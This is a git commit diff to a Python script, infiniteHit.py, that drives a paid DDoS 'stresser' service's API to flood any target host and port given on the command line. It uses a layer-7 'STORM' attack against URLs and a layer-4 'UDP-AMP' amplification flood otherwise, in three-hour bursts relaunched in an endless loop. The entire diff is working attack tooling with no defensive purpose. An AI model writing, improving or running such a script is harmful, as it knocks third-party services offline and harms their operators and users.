fd834c98e49f74b5880331815e56b9b321bed952
Kyrylo Avramenko <wkyrylo@gmail.com>
2022-03-06 23:07:04 -0800

    update script for layer7 and layer4

--- infiniteHit.py
+++ infiniteHit.py
@@ -1,23 +1,38 @@
 import time
 import os
 import requests
+import sys
+import json
+import validators
 from dotenv import load_dotenv
 
 load_dotenv()
 
 apiKey = os.getenv("API_KEY")
 apiPath = "https://stresser.ai/api/api.php"
-host = os.getenv("HOST")
-port = "80"
-duration = int(os.getenv("DURATION"))
-method = "UDP-AMP"
+host = sys.argv[1]
+port = sys.argv[2]
+duration = 10800
 
 
 def hitRequest():
-    r = requests.get(f"{apiPath}?key={apiKey}&action=layer4&host={host}&port={port}&time={duration}&method={method}")
+    print(f"Start hit {host}:{port}")
+    url = f"{apiPath}?key={apiKey}"
+    if validators.url(host):
+        url = f"{url}&action=layer7&host={host}&port={port}&time={duration}&method=STORM"
+    else:
+        locale = os.getenv("LOCALE") or ""
+        url = f"{url}&action=layer4&host={host}&port={port}&time={duration}&method=UDP-AMP&locale={locale}"
+
+    r = requests.get(url)
     print(r.text)
+
+    text = json.loads(r.text)
+    return text["status"] == True
 
 
 while True:
-    hitRequest()
+    if hitRequest() is False:
+        print("STOP")
+        break
     time.sleep(duration + 5)
